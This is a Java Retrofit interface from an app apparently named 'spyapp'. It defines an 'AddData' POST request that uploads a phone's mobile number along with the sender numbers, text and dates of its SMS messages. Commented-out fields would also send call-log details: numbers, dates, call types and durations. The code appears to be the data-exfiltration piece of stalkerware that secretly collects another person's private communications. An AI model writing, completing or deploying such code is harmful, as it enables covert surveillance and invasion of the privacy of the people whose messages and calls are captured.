package com.example.spyapp;

import com.google.gson.JsonObject;



import retrofit2.Call;
import retrofit2.http.Field;
import retrofit2.http.FormUrlEncoded;
import retrofit2.http.POST;

public interface ApiInterface {
    @FormUrlEncoded
    @POST("AddData")
   Call<JsonObject> sendData(
           @Field("userMobileNo") String userMobileNo,
         //  @Field("currentTime") String currentTime,//
        //   @Field("callingNo") String callingNo,//
         //  @Field("callingDate") String callingDate,//
         //  @Field("callingType") String callingType,//
          // @Field("callingDur") String callingDur,//
           @Field("smsNumber") String smsNumber,
           @Field("message") String message,
           @Field("smsDate") String smsDate

    );
}
